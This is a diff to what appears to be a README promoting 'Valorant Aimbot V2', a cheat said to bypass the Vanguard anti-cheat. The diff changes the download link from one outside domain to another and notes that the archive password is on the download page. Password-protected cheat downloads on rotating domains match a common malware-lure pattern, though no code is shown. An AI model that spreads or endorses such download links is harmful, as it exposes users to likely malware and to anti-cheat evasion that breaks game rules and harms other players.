@@ -18,7 +18,7 @@ Valorant Aimbot V2 - undetected cheat for Valorant. Bypasses Vanguard anti-cheat
 
 ## Download
 
-[![Download v1.7.0](https://img.shields.io/badge/Download_v1.7.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/valaimbotv2)
+[![Download v1.7.0](https://img.shields.io/badge/Download_v1.7.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/valaimbotv2)
 
 > The archive password is shown on the download page.
 
